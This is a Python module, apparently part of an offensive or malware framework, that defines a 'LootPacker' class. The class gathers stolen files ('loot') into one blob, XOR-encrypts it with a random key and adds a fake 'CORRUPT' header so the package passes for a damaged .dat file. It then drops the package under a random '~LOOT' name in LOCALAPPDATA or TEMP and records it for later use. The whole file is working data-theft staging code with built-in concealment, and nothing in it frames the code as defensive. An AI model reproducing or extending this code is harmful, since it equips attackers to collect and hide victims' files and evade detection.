import os
import random
from typing import List

from core.storage.manager import set_last_loot, add_loot


class LootPacker:
    """Utility to consolidate multiple loot files into a single encrypted package.

    The container format is intentionally minimal: each entry is stored as
    <name_length(2)> <name> <data_length(4)> <data>.  When the aggregation is
    complete the entire blob is XOR'd with a 32‑byte key and a bogus header is
    prepended so that the resulting file resembles a corrupted .dat file.
    """

    def __init__(self, key: bytes | None = None):
        self.key = key or os.urandom(32)

    def pack(self, paths: List[str]) -> bytes:
        """Return packed, encrypted bytes for the provided list of file paths."""
        container = bytearray()
        for p in paths:
            try:
                with open(p, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            name = os.path.basename(p).encode("utf-8")
            container += len(name).to_bytes(2, "little")
            container += name
            container += len(data).to_bytes(4, "little")
            container += data
        # XOR encryption pass
        enc = bytearray()
        for i, b in enumerate(container):
            enc.append(b ^ self.key[i % len(self.key)])
        # fake corrupt header
        header = b"\x00\xff" + os.urandom(10) + b"CORRUPT"
        return header + bytes(enc)

    def save(self, paths: List[str], output_path: str | None = None) -> str:
        """Pack given file list and optionally save to disk.

        If output_path is omitted a random name under TEMP is chosen.  The
        saved file is also recorded as the latest loot.
        """
        packaged = self.pack(paths)
        if output_path is None:
            outdir = os.environ.get("LOCALAPPDATA") or os.environ.get("TEMP") or os.getcwd()
            fname = "~LOOT" + os.urandom(4).hex() + ".dat"
            output_path = os.path.join(outdir, fname)
        try:
            with open(output_path, "wb") as f:
                f.write(packaged)
            # record the package as loot
            set_last_loot(output_path)
            add_loot(output_path)
        except Exception:
            pass
        return output_path
